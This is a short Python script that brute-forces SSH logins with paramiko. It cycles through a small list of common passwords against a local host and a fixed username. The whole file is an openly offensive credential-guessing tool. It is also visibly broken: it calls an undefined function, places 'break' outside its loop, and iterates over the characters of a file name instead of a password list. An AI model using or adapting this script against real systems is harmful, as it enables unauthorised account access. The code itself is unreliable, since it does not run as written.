import paramiko
import time

def main(host, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(host, username=username, password=password)
        print("Connection established")
        return True
    except paramiko.ssh_exception.AuthenticationException:
        print("Authentication failed")
        return False
    finally:
        client.close()

def brutforse_SSH(host, username, password):
    for password in password:
        print("Trying to connect to Brutforse SSH")

    if try_ssh_login(host, username, password):
         print("Successfully connected to Brutforse SSH")
         break
    else:
         print("Failed to connect to Brutforse SSH")
    time.sleep(5)

wordlist = "wordlist.txt" or ['password123', 'kali', 'qwerty', '12345', 'main']

host = '127.0.0.1'
username = 'user'

brutforse_SSH(host, username, wordlist)